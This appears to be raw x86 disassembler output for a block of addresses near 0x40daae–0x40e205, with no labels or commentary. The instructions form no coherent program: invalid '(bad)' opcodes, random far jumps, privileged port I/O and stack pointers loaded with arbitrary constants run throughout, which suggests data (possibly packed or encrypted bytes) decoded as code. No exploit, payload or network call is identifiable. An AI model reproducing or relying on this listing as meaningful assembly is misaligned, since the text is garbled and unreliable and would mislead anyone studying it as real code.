  40daae:	push   ds
  40daaf:	daa    
  40dab0:	pop    eax
  40dab1:	pusha  
  40dab2:	mov    esp,0xbe8809cc
  40dab7:	xchg   edi,eax
  40dab8:	outs   dx,BYTE PTR ds:[esi]
  40dab9:	shl    DWORD PTR [esp+ecx*4-0x6a],1
  40dabd:	nop
  40dabe:	inc    ecx
  40dabf:	stc    
  40dac0:	data16 sar bh,cl
  40dac3:	gs out dx,eax
  40dac5:	out    0xf5,eax
  40dac7:	inc    ebp
  40dac8:	fstp   TBYTE PTR [edi]
  40daca:	and    al,0xa5
  40dacc:	push   edi
  40dacd:	mov    ebx,DWORD PTR [edx-0x6a]
  40dad0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dad1:	ins    BYTE PTR es:[edi],dx
  40dad2:	jmp    0xa9585ae2
  40dad7:	and    DWORD PTR [eax],esi
  40dad9:	bound  esi,QWORD PTR ds:0x9d51cafa
  40dadf:	stc    
  40dae0:	hlt    
  40dae1:	sbb    DWORD PTR [ecx-0x559f795d],eax
  40dae7:	pop    eax
  40dae8:	ret    0x4a68
  40daeb:	sbb    BYTE PTR [ecx+0x3c],ah
  40daee:	mov    ebx,DWORD PTR [eax-0x25cd01d7]
  40daf4:	neg    ebp
  40daf6:	mov    DWORD PTR [edi-0x11bc822c],edi
  40dafc:	and    edi,esp
  40dafe:	jnp    0x40dae7
  40db00:	push   ss
  40db01:	fcom   DWORD PTR [eax-0xb]
  40db04:	pop    ds
  40db05:	rcl    edi,cl
  40db07:	jnp    0x40dae3
  40db09:	and    esp,DWORD PTR [edi]
  40db0b:	or     dh,dh
  40db0d:	inc    edx
  40db0e:	cs (bad) 
  40db10:	enter  0xb326,0xb2
  40db14:	ret    
  40db15:	cmp    BYTE PTR [edi+0x8],bh
  40db18:	xchg   ebp,eax
  40db19:	xor    al,0x30
  40db1b:	push   cs
  40db1c:	inc    edi
  40db1d:	push   ss
  40db1e:	int    0x14
  40db20:	push   edx
  40db21:	mov    dh,0x7d
  40db23:	fdiv   QWORD PTR [eax]
  40db25:	ret    
  40db26:	jmp    0xbd2343df
  40db2b:	or     eax,0xdaef5fdf
  40db30:	pop    eax
  40db31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db32:	mov    eax,0xab75b2fc
  40db37:	jp     0x40dadb
  40db39:	retf   0xe269
  40db3c:	adc    al,0x34
  40db3e:	iret   
  40db3f:	mov    dl,0x2
  40db41:	and    al,0x63
  40db43:	pop    ds
  40db44:	je     0x40db05
  40db46:	mov    esp,0x6a2336c6
  40db4b:	popa   
  40db4c:	out    dx,eax
  40db4d:	ins    BYTE PTR es:[edi],dx
  40db4e:	jecxz  0x40db92
  40db50:	mov    BYTE PTR [edi+0x69],bl
  40db53:	gs ins DWORD PTR es:[edi],dx
  40db55:	xor    al,0xf5
  40db57:	add    bh,BYTE PTR [ebx]
  40db59:	mov    bh,0x2b
  40db5b:	fldcw  WORD PTR [esi+0x42fa0fa6]
  40db61:	shr    BYTE PTR [eax],1
  40db63:	dec    esp
  40db64:	mov    ds:0x39199572,al
  40db69:	add    ebx,DWORD PTR [edi+0x298085ae]
  40db6f:	cmp    esi,eax
  40db71:	and    ecx,DWORD PTR [ecx-0x9]
  40db74:	xor    BYTE PTR ss:[esi+0x5e8f3297],bl
  40db7b:	jo     0x40db8e
  40db7d:	inc    eax
  40db7e:	xlat   BYTE PTR ds:[ebx]
  40db7f:	scas   al,BYTE PTR es:[edi]
  40db80:	pop    ds
  40db81:	mov    ebp,0x33db20fe
  40db86:	rol    al,0x14
  40db89:	pop    eax
  40db8a:	in     al,dx
  40db8b:	or     DWORD PTR [edx-0x7c2ef5a0],esp
  40db91:	or     al,BYTE PTR [esi+0x37]
  40db94:	push   esi
  40db95:	inc    edx
  40db96:	pop    esi
  40db97:	nop
  40db98:	adc    al,0x29
  40db9a:	sbb    eax,0x2c52389e
  40db9f:	mov    esi,DWORD PTR [ecx]
  40dba1:	xchg   edi,eax
  40dba2:	jo     0x40dc13
  40dba4:	push   ebp
  40dba5:	mov    ah,0xe5
  40dba7:	popa   
  40dba8:	and    eax,0xdc287b49
  40dbad:	out    0xa0,eax
  40dbaf:	mov    edi,0xa8e51470
  40dbb4:	mov    ebx,0x338ac02f
  40dbb9:	(bad)  
  40dbba:	jne    0x40dbbc
  40dbbc:	jb     0x40dbc0
  40dbbe:	add    ah,0x13
  40dbc1:	lea    ebx,[edi+0x6df4a0cb]
  40dbc7:	dec    edx
  40dbc8:	pushf  
  40dbc9:	mov    ecx,0xce5fe8b3
  40dbce:	clc    
  40dbcf:	mov    BYTE PTR [eax],bl
  40dbd1:	daa    
  40dbd2:	jmp    0xd42e:0xb779d81c
  40dbd9:	mov    es,WORD PTR [esi]
  40dbdb:	iret   
  40dbdc:	push   edx
  40dbdd:	add    al,0x95
  40dbdf:	and    eax,0x4df41180
  40dbe4:	add    eax,0xda5510df
  40dbe9:	pushf  
  40dbea:	shl    BYTE PTR [edi+0x3a],1
  40dbed:	adc    ah,BYTE PTR [ebp-0x32]
  40dbf0:	mov    cl,BYTE PTR [eax-0x18]
  40dbf3:	enter  0xf34f,0xc9
  40dbf7:	mov    edx,DWORD PTR [eax-0x2ed5d2a]
  40dbfd:	mov    ch,0xe2
  40dbff:	(bad)  
  40dc00:	daa    
  40dc01:	vpmulhuw xmm5,xmm7,XMMWORD PTR [edi]
  40dc05:	dec    edi
  40dc06:	xor    al,0x94
  40dc08:	das    
  40dc09:	or     DWORD PTR [ebp-0x2bdc847e],esi
  40dc0f:	dec    eax
  40dc10:	stos   DWORD PTR es:[edi],eax
  40dc11:	je     0x40dba1
  40dc13:	mov    al,ds:0xb3c5ef68
  40dc18:	outs   dx,DWORD PTR ds:[esi]
  40dc19:	push   es
  40dc1a:	cmp    al,0x56
  40dc1c:	xchg   ebp,eax
  40dc1d:	and    edi,DWORD PTR [eax+ebx*8]
  40dc20:	scas   eax,DWORD PTR es:[edi]
  40dc21:	icebp  
  40dc22:	xor    cl,bh
  40dc24:	retf   
  40dc25:	jae    0x40dc0d
  40dc27:	push   ecx
  40dc28:	inc    esi
  40dc29:	mov    esp,cs
  40dc2b:	cmc    
  40dc2c:	mov    esp,0xa1dbfd14
  40dc31:	out    dx,eax
  40dc32:	mov    al,ds:0xbbc5e172
  40dc37:	or     eax,0x9c7225
  40dc3c:	sub    eax,DWORD PTR [edi+0x1e]
  40dc3f:	inc    ebp
  40dc40:	cmp    eax,0xbb754c2a
  40dc45:	sbb    BYTE PTR [ecx+0x14],0xa2
  40dc49:	hlt    
  40dc4a:	in     al,0x2e
  40dc4c:	mov    cl,0xef
  40dc4e:	addr16 pusha 
  40dc50:	data16 mov al,0xa9
  40dc53:	inc    ecx
  40dc54:	jno    0x40dc70
  40dc56:	or     al,0x3
  40dc58:	(bad)  
  40dc59:	jne    0x40dc83
  40dc5b:	pop    esp
  40dc5c:	cmp    esp,DWORD PTR [edi-0x31]
  40dc5f:	mov    cl,0xe4
  40dc61:	out    0xd2,al
  40dc63:	cmp    al,0x11
  40dc65:	psubsw mm6,mm2
  40dc68:	pop    ebp
  40dc69:	fimul  DWORD PTR [esi+0x5d1b21cf]
  40dc6f:	and    al,BYTE PTR [eax]
  40dc71:	rol    edi,0xe7
  40dc74:	int    0xa2
  40dc76:	test   al,0xcc
  40dc78:	sub    eax,DWORD PTR [eax-0x352e64d7]
  40dc7e:	ins    BYTE PTR es:[edi],dx
  40dc7f:	mov    ds:0xc7999aa4,eax
  40dc84:	int3   
  40dc85:	arpl   WORD PTR [esi],si
  40dc87:	sar    DWORD PTR [esi-0x21df933f],1
  40dc8d:	js     0x40dcac
  40dc8f:	sti    
  40dc90:	fcom   DWORD PTR [eax]
  40dc92:	lahf   
  40dc93:	sub    al,0xbf
  40dc95:	xchg   ebp,eax
  40dc96:	mov    ss,esp
  40dc98:	fisub  WORD PTR [ebx+0x76]
  40dc9b:	push   ebp
  40dc9c:	add    ch,BYTE PTR ds:[edi]
  40dc9f:	xlat   BYTE PTR ds:[ebx]
  40dca0:	jmp    0x40dd0c
  40dca2:	fadd   st(6),st
  40dca4:	dec    esi
  40dca5:	jmp    0x40dd0b
  40dca7:	jnp    0x40dd11
  40dca9:	imul   edx,eax,0xf5cafc16
  40dcaf:	pop    ebx
  40dcb0:	(bad)  [ecx-0x43]
  40dcb3:	lea    ebx,[edi+esi*4+0x66]
  40dcb7:	imul   esp,DWORD PTR [edi+ecx*1-0x27],0x54
  40dcbc:	jb     0x40dc78
  40dcbe:	jnp    0x40dcba
  40dcc0:	sbb    al,0xb7
  40dcc2:	sub    ch,ch
  40dcc4:	jecxz  0x40dc9d
  40dcc6:	cmp    DWORD PTR [ecx+0x7d15de1e],0x38
  40dccd:	test   BYTE PTR [eax],cl
  40dccf:	shl    esi,0xf0
  40dcd2:	dec    edi
  40dcd3:	push   ebp
  40dcd4:	sub    eax,DWORD PTR [eax+0x60bf84a9]
  40dcda:	je     0x40dcd6
  40dcdc:	xchg   edi,eax
  40dcdd:	sub    DWORD PTR [esi],ecx
  40dcdf:	push   es
  40dce0:	aas    
  40dce1:	(bad)  
  40dce2:	test   al,0xe3
  40dce4:	repnz iret 
  40dce6:	adc    ebx,DWORD PTR [ecx]
  40dce8:	in     eax,0x7f
  40dcea:	fwait
  40dceb:	add    al,0x59
  40dced:	retf   0xdb58
  40dcf0:	inc    esi
  40dcf1:	xor    al,0x94
  40dcf3:	add    ebp,0x7
  40dcf6:	aaa    
  40dcf7:	push   0x99f51e14
  40dcfc:	sub    al,0x35
  40dcfe:	cmp    DWORD PTR [edi+0x4f],ebp
  40dd01:	pop    edx
  40dd02:	ds push ecx
  40dd04:	mov    eax,ebp
  40dd06:	pop    ds
  40dd07:	iret   
  40dd08:	shr    DWORD PTR [edi],1
  40dd0a:	fimul  DWORD PTR [eax]
  40dd0c:	push   es
  40dd0d:	pop    ecx
  40dd0e:	pop    edx
  40dd0f:	cmp    DWORD PTR ds:0xec5979e1,esi
  40dd15:	mov    edx,ss
  40dd17:	dec    edx
  40dd18:	dec    esp
  40dd19:	mov    BYTE PTR [esi+0x57],cl
  40dd1c:	add    ah,BYTE PTR [esi+esi*2+0x4e]
  40dd20:	dec    edi
  40dd21:	clc    
  40dd22:	pushf  
  40dd23:	adc    eax,0x93afdd74
  40dd28:	dec    esi
  40dd29:	out    0x45,al
  40dd2b:	das    
  40dd2c:	lds    ebp,FWORD PTR [ebp-0x2d58fbd6]
  40dd32:	xor    BYTE PTR [eax-0x53],cl
  40dd35:	and    eax,0x76dcebe2
  40dd3a:	and    edx,eax
  40dd3c:	(bad)  
  40dd3d:	push   ss
  40dd3e:	cs sbb eax,0xab923834
  40dd44:	and    esp,esi
  40dd46:	add    eax,DWORD PTR [ecx-0x133fa451]
  40dd4c:	and    eax,eax
  40dd4e:	mov    ds:0xa5c685b1,eax
  40dd53:	fstp   TBYTE PTR [eax+0x37465b29]
  40dd59:	fcomp  st(2)
  40dd5b:	mov    edx,0x822013c2
  40dd60:	out    dx,eax
  40dd61:	xchg   edx,eax
  40dd62:	loop   0x40dd80
  40dd64:	mov    ecx,0x50155606
  40dd69:	xchg   ah,ah
  40dd6b:	and    dh,dl
  40dd6d:	repz adc eax,0xda8b3355
  40dd73:	push   0xf627cab6
  40dd78:	and    eax,0x6752f9ec
  40dd7d:	mov    edi,DWORD PTR [eax]
  40dd7f:	es push 0xffffff97
  40dd82:	stos   DWORD PTR es:[edi],eax
  40dd83:	add    DWORD PTR [esi-0x7],ecx
  40dd86:	in     eax,0xa5
  40dd88:	in     al,0xf5
  40dd8a:	cmp    esi,DWORD PTR [ecx+0x63d1a14]
  40dd90:	out    0xc3,al
  40dd92:	int3   
  40dd93:	xchg   ecx,eax
  40dd94:	les    ebx,FWORD PTR [eax]
  40dd96:	in     eax,dx
  40dd97:	addr16 inc edx
  40dd99:	scas   al,BYTE PTR es:[edi]
  40dd9a:	inc    eax
  40dd9b:	jg     0x40dda6
  40dd9d:	sub    ebp,DWORD PTR [edx+0x32252681]
  40dda3:	mov    ch,0x6d
  40dda5:	xor    eax,0x7266e22e
  40ddaa:	(bad)  
  40ddab:	frstor [eax]
  40ddad:	and    al,0xbd
  40ddaf:	push   0x87b5c924
  40ddb4:	popf   
  40ddb5:	mov    bh,0xdf
  40ddb7:	sar    BYTE PTR [edx+0x19],cl
  40ddba:	mov    al,0x45
  40ddbc:	shr    DWORD PTR [esi+0x1aaad128],0xf1
  40ddc3:	jne    0x40ddab
  40ddc5:	int    0x8e
  40ddc7:	adc    edi,DWORD PTR [ebx+0x29]
  40ddca:	mov    ds:0x32295e08,eax
  40ddcf:	(bad)  
  40ddd0:	jnp    0x40de20
  40ddd2:	pop    esp
  40ddd3:	lds    edi,FWORD PTR [ebp+0x54121e61]
  40ddd9:	pop    eax
  40ddda:	out    0x8c,eax
  40dddc:	cmp    al,0xa3
  40ddde:	sub    al,0x80
  40dde0:	push   ecx
  40dde1:	(bad)  
  40dde2:	ret    
  40dde3:	or     esi,ecx
  40dde5:	out    dx,eax
  40dde6:	jmp    0x4ea5:0x1ef6f08d
  40dded:	cwde   
  40ddee:	test   al,0x3f
  40ddf0:	shr    al,cl
  40ddf2:	add    bh,BYTE PTR ds:0x363fb347
  40ddf8:	mov    eax,DWORD PTR [edx-0x7f92183e]
  40ddfe:	cs jmp 0x40dd83
  40de01:	inc    ecx
  40de02:	push   ecx
  40de03:	lea    eax,[esi]
  40de05:	push   cs
  40de06:	out    dx,al
  40de07:	aam    0xa6
  40de09:	packssdw mm5,QWORD PTR [esp+esi*4+0x4e]
  40de0e:	(bad)  
  40de0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de10:	xchg   al,bh
  40de12:	adc    dh,dh
  40de14:	ret    
  40de15:	or     eax,0x7bbb621f
  40de1a:	rcl    BYTE PTR [ebp-0x763db6d9],0x72
  40de21:	jle    0x40de1a
  40de23:	bound  edx,QWORD PTR [edi]
  40de25:	pop    esp
  40de26:	jno    0x40ddcd
  40de28:	hlt    
  40de29:	loopne 0x40de99
  40de2b:	test   al,0x4
  40de2d:	ret    
  40de2e:	aam    0x80
  40de30:	mov    esi,0xc76380a7
  40de35:	cmp    al,0xb4
  40de37:	mov    ebx,0x8fcd337d
  40de3c:	cmp    dl,BYTE PTR [ebx+eiz*4]
  40de3f:	test   al,0x5d
  40de41:	push   edx
  40de42:	iret   
  40de43:	retf   
  40de44:	cwde   
  40de45:	out    0xd7,al
  40de47:	push   eax
  40de48:	scas   eax,DWORD PTR es:[edi]
  40de49:	out    0x31,al
  40de4b:	jae    0x40de93
  40de4d:	pop    edx
  40de4e:	xor    ebp,DWORD PTR [ecx+esi*2]
  40de51:	xchg   ebp,eax
  40de52:	add    al,0x1f
  40de54:	cmp    al,BYTE PTR [ecx+0x67]
  40de57:	div    edx
  40de59:	mov    edx,0x5eb07c6c
  40de5e:	fist   WORD PTR [edi+0x32ea63b4]
  40de64:	or     eax,0xbaf4d5e9
  40de69:	fdivrp st(7),st
  40de6b:	retf   
  40de6c:	sub    BYTE PTR [ebp-0x3a],bh
  40de6f:	icebp  
  40de70:	pop    edi
  40de71:	xor    BYTE PTR [edx],bl
  40de73:	aad    0x0
  40de75:	lea    esi,[edi+0x53c5f3ae]
  40de7b:	loopne 0x40dea5
  40de7d:	sbb    ebp,esp
  40de7f:	jmp    0x40de76
  40de81:	add    BYTE PTR [ecx],0xb7
  40de84:	xchg   esi,eax
  40de85:	(bad)  
  40de86:	clc    
  40de87:	xchg   ebx,eax
  40de88:	mov    dl,0x24
  40de8a:	mov    ds:0x361632df,al
  40de8f:	push   ebp
  40de90:	jg     0x40deac
  40de92:	xchg   al,dh
  40de94:	jle    0x40df12
  40de96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de97:	inc    edx
  40de98:	loopne 0x40de63
  40de9a:	fdiv   QWORD PTR [esi+ebp*2]
  40de9d:	mov    edi,0x7aa5e8b6
  40dea2:	pop    esp
  40dea3:	pop    ecx
  40dea4:	ins    BYTE PTR es:[edi],dx
  40dea5:	mov    edi,0x7b27bf2c
  40deaa:	pop    ds
  40deab:	cmp    eax,0x59436a4c
  40deb0:	dec    eax
  40deb1:	imul   esi,edx,0xffffffba
  40deb4:	or     BYTE PTR [edi],dh
  40deb6:	pop    edi
  40deb7:	cwde   
  40deb8:	sbb    eax,0x1485a9d
  40debd:	ret    0x322c
  40dec0:	pop    ds
  40dec1:	mov    ebx,0xa42b406e
  40dec6:	in     eax,0x40
  40dec8:	jae    0x40df20
  40deca:	arpl   di,di
  40decc:	frstor [ebx]
  40dece:	in     eax,dx
  40decf:	fdivr  QWORD PTR [edx+0x33]
  40ded2:	mov    DWORD PTR [esi+0x28],esi
  40ded5:	mov    ch,BYTE PTR [ebx]
  40ded7:	jo     0x40de71
  40ded9:	xor    BYTE PTR [ecx-0x6d],0x66
  40dedd:	ds call 0x243a35b8
  40dee3:	adc    ch,bl
  40dee5:	dec    ebx
  40dee6:	inc    esi
  40dee7:	push   ss
  40dee8:	pusha  
  40dee9:	mov    eax,ds:0xab1dc186
  40deee:	sbb    eax,0xc905b3ee
  40def3:	fidiv  DWORD PTR [eax-0x2a4791fd]
  40def9:	sbb    al,bl
  40defb:	pop    ebp
  40defc:	enter  0x7bd9,0x98
  40df00:	sbb    edx,DWORD PTR [edi]
  40df02:	pcmpgtb mm3,QWORD PTR [edx+0x7f]
  40df06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df08:	adc    esi,DWORD PTR [edx+0x6bb8ff41]
  40df0e:	ins    BYTE PTR es:[edi],dx
  40df0f:	jmp    0x40dec2
  40df11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df12:	mov    ecx,0x13dd7c88
  40df17:	mov    bl,0x97
  40df19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df1a:	cli    
  40df1b:	mov    ds:0x23da687d,eax
  40df20:	mov    es,WORD PTR [esi-0x3102285d]
  40df26:	inc    edi
  40df27:	or     BYTE PTR [esi],0x25
  40df2a:	test   BYTE PTR [ecx+0x2],cl
  40df2d:	xor    eax,0x8abeed78
  40df32:	lods   al,BYTE PTR ds:[esi]
  40df33:	xor    BYTE PTR ds:0x49ff3f3,0x8
  40df3a:	enter  0xbc1d,0xfc
  40df3e:	retf   
  40df3f:	dec    sp
  40df41:	popa   
  40df42:	sar    DWORD PTR [ecx-0x5be1a116],0x2d
  40df49:	push   ebp
  40df4a:	scas   eax,DWORD PTR es:[edi]
  40df4b:	fxch   st(5)
  40df4d:	icebp  
  40df4e:	mov    dh,0xae
  40df50:	inc    DWORD PTR [edx+0x6b735c68]
  40df56:	(bad)
  40df5a:	scas   eax,DWORD PTR es:[edi]
  40df5b:	not    cl
  40df5d:	mov    eax,ds:0x8f506af3
  40df62:	adc    BYTE PTR [ebp+0x3f974153],dl
  40df68:	(bad)  [edx]
  40df6a:	out    dx,al
  40df6b:	xor    eax,0x53883e4c
  40df70:	test   BYTE PTR [esi],0xed
  40df73:	pop    es
  40df74:	pop    eax
  40df75:	inc    ebx
  40df76:	and    dl,BYTE PTR [edi+0x5a5b86a8]
  40df7c:	rep stos BYTE PTR es:[edi],al
  40df7e:	adc    BYTE PTR [esi],dl
  40df80:	iret   
  40df81:	dec    edi
  40df82:	jbe    0x40e000
  40df84:	push   es
  40df85:	pop    esi
  40df86:	add    ecx,DWORD PTR [ebx]
  40df88:	xor    dl,BYTE PTR [ebp+0x6]
  40df8b:	jmp    0x4b88:0x733b98a8
  40df92:	in     eax,0x2a
  40df94:	inc    esp
  40df95:	sub    eax,0x29372429
  40df9a:	mov    al,ds:0x63cf179d
  40df9f:	ret    0x47d6
  40dfa2:	aad    0xe4
  40dfa4:	int3   
  40dfa5:	push   esi
  40dfa6:	jge    0x40dfd8
  40dfa8:	inc    ecx
  40dfa9:	loop   0x40dff5
  40dfab:	adc    dl,bh
  40dfad:	xchg   ebp,eax
  40dfae:	(bad)  
  40dfaf:	in     al,dx
  40dfb0:	inc    edi
  40dfb1:	dec    ebx
  40dfb2:	jge    0x40df90
  40dfb4:	mov    ch,0xa0
  40dfb6:	push   es
  40dfb7:	nop
  40dfb8:	shr    DWORD PTR [ecx-0x5030f2f1],1
  40dfbe:	jp     0x40df6e
  40dfc0:	jl     0x40df5c
  40dfc2:	push   ebx
  40dfc3:	dec    eax
  40dfc4:	push   0xffffffc8
  40dfc6:	inc    esi
  40dfc7:	mov    bh,0x73
  40dfc9:	xor    eax,0x96026b75
  40dfce:	pushf  
  40dfcf:	stos   BYTE PTR es:[edi],al
  40dfd0:	outs   dx,DWORD PTR ds:[esi]
  40dfd1:	sar    esi,1
  40dfd3:	cmp    DWORD PTR [ecx],edx
  40dfd5:	push   edi
  40dfd6:	jnp    0x40e03f
  40dfd8:	dec    esp
  40dfd9:	push   edx
  40dfda:	push   0xbffff3fb
  40dfdf:	xchg   ecx,eax
  40dfe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfe1:	and    BYTE PTR [edi],0x42
  40dfe4:	ror    al,0xf1
  40dfe7:	mov    esp,0x2c73fdd1
  40dfec:	cwd    
  40dfee:	jne    0x40e06f
  40dff0:	scas   eax,DWORD PTR es:[edi]
  40dff1:	or     BYTE PTR [edx-0x31],bh
  40dff4:	mov    edx,ecx
  40dff6:	out    0xe9,al
  40dff8:	aad    0xb
  40dffa:	or     eax,0x73f179e5
  40dfff:	(bad)  
  40e001:	sbb    cl,BYTE PTR [eax+esi*2+0x68]
  40e005:	enter  0xd991,0x3d
  40e009:	push   edi
  40e00a:	jno    0x40dff8
  40e00c:	xchg   esi,eax
  40e00d:	jl     0x40dfc0
  40e00f:	add    bl,cl
  40e011:	sbb    BYTE PTR [ebp+0x9],cl
  40e014:	enter  0xda4b,0x2a
  40e018:	dec    ecx
  40e019:	in     eax,0x2e
  40e01b:	js     0x40dffc
  40e01d:	inc    edx
  40e01e:	mul    DWORD PTR [edx+0x64]
  40e021:	loopne 0x40e060
  40e023:	or     BYTE PTR [edx],dh
  40e025:	or     bh,BYTE PTR [eax+0x59]
  40e028:	call   0x4318:0x74c8715a
  40e02f:	dec    esi
  40e030:	or     cl,BYTE PTR [eax-0x7e23ff61]
  40e036:	lock jp 0x40e06d
  40e039:	imul   esp,DWORD PTR [ecx-0xe99801e],0x32
  40e040:	stc    
  40e041:	inc    edx
  40e042:	imul   esi,DWORD PTR [ebx],0x9f573960
  40e048:	jmp    0x6cfa:0xefe89968
  40e04f:	mov    edi,ebx
  40e051:	xchg   esi,eax
  40e052:	mov    al,ds:0xb6609996
  40e057:	lods   eax,DWORD PTR ds:[esi]
  40e058:	mov    al,ds:0xf67e16fa
  40e05d:	(bad)  
  40e05e:	and    BYTE PTR [eax-0x7d],ch
  40e061:	sub    al,0xfb
  40e063:	pop    ecx
  40e064:	adc    DWORD PTR [ebp-0x974984],ebx
  40e06a:	out    dx,eax
  40e06b:	mov    eax,0xce8bde80
  40e070:	icebp  
  40e071:	sbb    BYTE PTR [esi+0x0],dl
  40e074:	dec    esp
  40e075:	xor    eax,0xbd4d6279
  40e07a:	arpl   WORD PTR [ebx-0x11],sp
  40e07d:	clc    
  40e07e:	out    dx,eax
  40e07f:	pop    ebp
  40e080:	fidivr DWORD PTR [ebx]
  40e082:	js     0x40e102
  40e084:	push   ss
  40e085:	shr    BYTE PTR [ebx-0x49],0x67
  40e089:	mov    es:0x44bad786,al
  40e08f:	das    
  40e090:	int    0x5d
  40e092:	mov    ch,0xf6
  40e094:	sub    al,0x47
  40e096:	push   ds
  40e097:	jo     0x40e053
  40e099:	pop    eax
  40e09a:	enter  0x4e46,0x6e
  40e09e:	xor    ebx,DWORD PTR [ebp-0x47]
  40e0a1:	vunpcklps ymm7,ymm1,ymm3
  40e0a5:	push   ss
  40e0a6:	push   ss
  40e0a7:	int    0x7e
  40e0a9:	inc    esi
  40e0aa:	nop
  40e0ab:	enter  0x724b,0x8e
  40e0af:	push   ebp
  40e0b0:	call   0xa651:0xc30dc70d
  40e0b7:	ss cs push 0xd936490f
  40e0be:	out    dx,al
  40e0bf:	xor    ebx,edx
  40e0c1:	push   es
  40e0c2:	sub    BYTE PTR [eax+edx*4],ah
  40e0c5:	jp     0x40e0e8
  40e0c7:	push   ebx
  40e0c8:	jno    0x40e04c
  40e0ca:	sbb    BYTE PTR fs:[edx+0x57c942ef],dl
  40e0d1:	lods   al,BYTE PTR ds:[esi]
  40e0d2:	fcom   DWORD PTR [edi]
  40e0d4:	mov    dh,0xa9
  40e0d6:	dec    esi
  40e0d7:	push   es
  40e0d8:	adc    dl,BYTE PTR [ecx+0x51c2ef2e]
  40e0de:	add    eax,ebp
  40e0e0:	aam    0xe1
  40e0e2:	jno    0x40e06e
  40e0e4:	fimul  DWORD PTR ds:0x194d88ba
  40e0ea:	dec    edi
  40e0eb:	xor    BYTE PTR [ecx-0x42],ch
  40e0ee:	mov    al,0x1c
  40e0f0:	xor    al,BYTE PTR [edi-0x24]
  40e0f3:	aas    
  40e0f4:	out    dx,al
  40e0f5:	dec    ebx
  40e0f6:	cmp    al,0x39
  40e0f8:	outs   dx,BYTE PTR ds:[esi]
  40e0f9:	xor    ch,BYTE PTR [esi]
  40e0fb:	dec    ebp
  40e0fc:	test   eax,0xe3da33a2
  40e101:	nop
  40e102:	push   0x74697d20
  40e107:	adc    eax,0x13abd92c
  40e10c:	into   
  40e10d:	push   ss
  40e10e:	dec    DWORD PTR [esi]
  40e110:	cmp    DWORD PTR ds:0xe53e540f,esp
  40e116:	lea    ebx,[eax]
  40e118:	sub    BYTE PTR [eax+ebx*1-0x29],al
  40e11c:	ret    
  40e11d:	(bad)  
  40e11e:	js     0x40e0b1
  40e120:	test   al,0x48
  40e122:	push   eax
  40e123:	jge    0x40e0d7
  40e125:	jbe    0x40e190
  40e127:	in     al,0x64
  40e129:	outs   dx,BYTE PTR ds:[esi]
  40e12a:	sub    dh,BYTE PTR [edx]
  40e12c:	leave  
  40e12d:	xchg   ecx,eax
  40e12e:	pusha  
  40e12f:	ret    0x1dff
  40e132:	sbb    DWORD PTR [esi-0x5f],esi
  40e135:	fcom   QWORD PTR [edx]
  40e137:	add    DWORD PTR [edx-0x5c],esi
  40e13a:	push   ebx
  40e13b:	ds push ebp
  40e13d:	out    0xa8,eax
  40e13f:	jl     0x40e168
  40e141:	jbe    0x40e161
  40e143:	imul   edx,DWORD PTR [eax-0x6f548a57],0xffffffca
  40e14a:	jmp    0x9b331afe
  40e14f:	adc    ebx,DWORD PTR [edx+0x13b8f2ec]
  40e155:	jmp    0x40e116
  40e157:	pop    esp
  40e158:	pop    ecx
  40e159:	test   DWORD PTR [eax+0x23],esi
  40e15c:	mov    ch,0x35
  40e15e:	into   
  40e15f:	rol    bl,1
  40e161:	stos   BYTE PTR es:[edi],al
  40e162:	in     al,0x27
  40e164:	in     eax,0xe9
  40e166:	jle    0x40e1e2
  40e168:	je     0x40e1dd
  40e16a:	adc    eax,0x7a7b191f
  40e16f:	out    dx,al
  40e170:	xchg   ecx,eax
  40e171:	stc    
  40e172:	out    0x90,al
  40e174:	pop    es
  40e175:	jcxz   0x40e130
  40e178:	outs   dx,DWORD PTR ds:[esi]
  40e179:	fld    TBYTE PTR [edi]
  40e17b:	rcl    BYTE PTR [edi-0x5d],0xa4
  40e17f:	jnp    0x40e114
  40e181:	(bad)  
  40e183:	sbb    eax,0x333f85eb
  40e188:	sahf   
  40e189:	stos   WORD PTR es:[edi],ax
  40e18b:	inc    edi
  40e18c:	rcl    bh,0x4
  40e18f:	sti    
  40e190:	mov    ds:0x809c7ddf,eax
  40e195:	js     0x40e146
  40e197:	mov    ecx,DWORD PTR [edx+0x4392a1]
  40e19d:	ret    
  40e19e:	outs   dx,DWORD PTR ds:[esi]
  40e19f:	mov    ebx,0x20308db6
  40e1a4:	xchg   edx,eax
  40e1a5:	and    ebx,DWORD PTR [ecx+0x19]
  40e1a8:	je     0x40e149
  40e1aa:	ret    
  40e1ab:	mov    ecx,DWORD PTR [ecx+0x62]
  40e1ae:	dec    esi
  40e1af:	jl     0x40e1fb
  40e1b1:	xchg   ebp,eax
  40e1b2:	sub    eax,0xcc29c5f2
  40e1b7:	aad    0xf8
  40e1b9:	fsub   st(4),st
  40e1bb:	adc    DWORD PTR [edi+0x2a],esi
  40e1be:	pop    edx
  40e1bf:	js     0x40e22b
  40e1c1:	lock sub cl,BYTE PTR [ebx+eax*1]
  40e1c5:	shr    DWORD PTR [edi],cl
  40e1c7:	(bad)  
  40e1c9:	test   al,0x8b
  40e1cb:	pop    ebx
  40e1cc:	(bad)  
  40e1cd:	adc    eax,0xe534b121
  40e1d2:	in     al,0x78
  40e1d4:	sbb    BYTE PTR [ebx-0xf311659],ah
  40e1da:	jns    0x40e16a
  40e1dc:	jg     0x40e214
  40e1de:	and    bl,BYTE PTR [ebp-0x2cc0fec9]
  40e1e4:	stc    
  40e1e5:	fucomp st(5)
  40e1e7:	xchg   edi,eax
  40e1e8:	cli    
  40e1e9:	jp     0x40e1eb
  40e1eb:	inc    esi
  40e1ec:	lea    ebp,[ecx+esi*8]
  40e1ef:	je     0x40e1b2
  40e1f1:	mov    cl,0xd5
  40e1f3:	shr    DWORD PTR [edx],0x4a
  40e1f6:	xlat   BYTE PTR ds:[ebx]
  40e1f7:	pop    es
  40e1f8:	inc    ecx
  40e1f9:	adc    esp,DWORD PTR [eax+0x59]
  40e1fc:	ja     0x40e203
  40e1fe:	push   esp
  40e1ff:	adc    eax,0x91e3d7c3
  40e204:	out    dx,al
  40e205:	sub    eax,0xffffffc7
